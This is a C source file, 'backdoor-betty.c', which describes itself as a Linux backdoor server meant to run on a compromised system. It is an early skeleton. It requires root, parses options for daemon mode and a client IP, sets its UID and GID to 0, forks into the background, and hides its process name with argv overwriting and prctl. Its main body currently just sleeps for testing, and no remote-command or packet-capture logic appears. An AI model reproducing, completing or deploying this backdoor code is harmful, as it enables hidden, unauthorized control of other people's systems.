/*-----------------------------------------------------------------------------
 * backdoor-betty.c - Linux backdoor server (runs on comprimised system)
 * Copyright (C) 2010 Steffen L. Norgren <ironix@trollop.org>
 * 
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *----------------------------------------------------------------------------*/

#include "backdoor-betty.h"
#include "utils.h"
#include "pkt_cap.h"

/*-----------------------------------------------------------------------------
 * FUNCTION:    main 
 * 
 * DATE:        June 4, 2010
 * 
 * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
 * 
 * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
 * 
 * INTERFACE:   int main(int argc, char **argv)
 *                  argc - argument count
 *                  argv - array of arguments
 * 
 * RETURNS:     Result on success or failure.
 *
 * NOTES: Main entry point into the program. Parses command-line arguments and
 *        configures the server.
 *
 *----------------------------------------------------------------------------*/
int main(int argc, char *argv[])
{
	/* make sure user is root */
	if (geteuid() != USER_ROOT) {
		fprintf(stderr, "Must be root to run this program.\n");
		exit(ERROR_NOTROOT);
	}

	/* parse CLI options */
	if (parse_options(argc, argv) == ERROR_OPTS) {
		err(1, "Invalid options");
		exit(ERROR_OPTS);
	}

	print_settings(argv[0]);

    signal(SIGTERM, signal_handler);
    signal(SIGQUIT, signal_handler);
    signal(SIGKILL, signal_handler);
    signal(SIGINT, signal_handler);
	
	/* raise privileges */
	if (set_root() == ERROR_NOTROOT) {
		err(1, "set_root");
	}

	/* daemonize the process */
	if (svr_vars.daemonize)
		daemonize();

	/* mask the process name */
	mask_process(argv, PROCESS_NAME);

	sleep(100); /* testing */

	return ERROR_NONE;
}

/*-----------------------------------------------------------------------------
 * FUNCTION:    print_settings
 * 
 * DATE:        May 17, 2010
 * 
 * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
 * 
 * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
 * 
 * INTERFACE:   void print_settings(char *command)
 *                   command - the program's name
 * 
 * RETURNS: void
 * 
 * NOTES: Prints out the current settings that are being used in the current
 *        run of the application.
 *
 *----------------------------------------------------------------------------*/
void print_settings(char *command)
{
	fprintf(stderr, "Using the Following Options: (For help use \"%s -h\")\n", command);
	if (svr_vars.daemonize)
		fprintf(stderr, "  Running as daemon:   TRUE\n");
	else
		fprintf(stderr, "  Running as daemon:   FALSE\n");
	fprintf(stderr, "  Client's IP Address: %s\n", svr_vars.client_ip);
}

/*-----------------------------------------------------------------------------
 * FUNCTION:    print_usage
 * 
 * DATE:        May 18, 2010
 * 
 * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
 * 
 * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
 * 
 * INTERFACE:   void print_usage(char *command, int err)
 *                   command - the program's name
 *                   err - error produced
 * 
 * RETURNS: void
 * 
 * NOTES: Prints out the program's useage information if the user incorrectly
 *        entered an option or used the -h or --help option.
 *
 *----------------------------------------------------------------------------*/
void print_usage(char *command, int err)
{
    if (err == ERROR_OPTS_HELP) {
        fprintf(stderr, "usage: %s [arguments]\n\n", command);
        fprintf(stderr, "Arguments:\n");
        fprintf(stderr, "  -d  or  --daemon  Run as a background daemon\n");
        fprintf(stderr, "  -c  or  --client  Client's IP address\n");
        fprintf(stderr, "  -h  or  --help    Prints out this screen\n");
		exit(ERROR_OPTS_HELP);
    }
	else if (err == ERROR_OPTS)
        fprintf(stderr, "Try `%s --help` for more information.\n", command);
	else {
        fprintf(stderr, "%s: unknown error\n", command);
        fprintf(stderr, "Try `%s --help` for more information.\n", command);
    }	
}

/*-----------------------------------------------------------------------------
 * FUNCTION:    parse_options 
 * 
 * DATE:        May 17, 2010
 * 
 * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
 * 
 * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
 * 
 * INTERFACE:   parse_options(int argc, char *argv[])
 *                    argc - argument count
 *                    argv - argument list
 * 
 * RETURNS:     ERROR_NONE on success ERROR_OPTS on failure.
 * 
 * NOTES: Sets default options and parses any command-line options.
 *
 *----------------------------------------------------------------------------*/
int parse_options(int argc, char *argv[])
{
	int c, option_index = 0;

	static struct option long_options[] =
	{
		{"daemon"		, no_argument		, 0, 'd'},
		{"client"		, required_argument	, 0, 'c'},
		{"help"			, no_argument		, 0, 'h'},
		{0, 0, 0, 0}
	};

	/* set defaults */
	svr_vars.daemonize = FALSE;
	svr_vars.client_ip = CLIENT_IP;
	print_output = FALSE;

	/* parse options */
	while (TRUE) {
		c = getopt_long(argc, argv, "dc:h", long_options, &option_index);

		if (c == -1)
			break;

		switch (c) {
			case 0:
				if (long_options[option_index].flag != 0)
					break;
				break;

			case 'd':
				svr_vars.daemonize = TRUE;
				print_output = TRUE;
				break;

			case 'c':
				svr_vars.client_ip = optarg;
				break;

			case 'h':
				print_usage(argv[0], ERROR_OPTS_HELP);
				break;			

			default:
				print_usage(argv[0], ERROR_OPTS);
				return ERROR_OPTS;
				break;
		}
	}

	return ERROR_NONE;
}

void signal_handler(int sig)
{
	switch(sig) {
		case SIGTERM:
			if (print_output)
				fprintf(stderr, "Received SIGTERM, terminating.\n");
			exit_clean();
		case SIGQUIT:
			if (print_output)
				fprintf(stderr, "Received SIGQUIT, terminating.\n");
			exit_clean();
		case SIGKILL:
			if (print_output)
				fprintf(stderr, "Received SIGKILL, terminating.\n");
			exit_clean();
		case SIGINT:
			if (print_output)
				fprintf(stderr, "\nReceived SIGINT, terminating.\n");
			exit_clean();
		default:
			break;
	}
}

void exit_clean()
{
	/* close sockets etc... */
	if (print_output)
		fprintf(stderr, "Exited cleanly.\n");
	exit(ERROR_NONE);
}

void daemonize()
{
	pid_t pid;

	/* fork off the parent process */
	pid = fork();
	if (pid < ERROR_NONE)
		err(1, "fork");
	else if (pid > ERROR_NONE) /* exit parent process */
		exit(ERROR_NONE);
}

int set_root()
{
	/* change the UID/GIT to 0 (root) */
	if (setuid(0) != ERROR_NONE || setgid(0) != ERROR_NONE)
		return ERROR_NOTROOT;

	return ERROR_NONE;
}

void mask_process(char *argv[], char *name)
{
	memset(argv[0], 0, strlen(argv[0]));
	strcpy(argv[0], name);
	prctl(PR_SET_NAME, name, 0, 0);
}
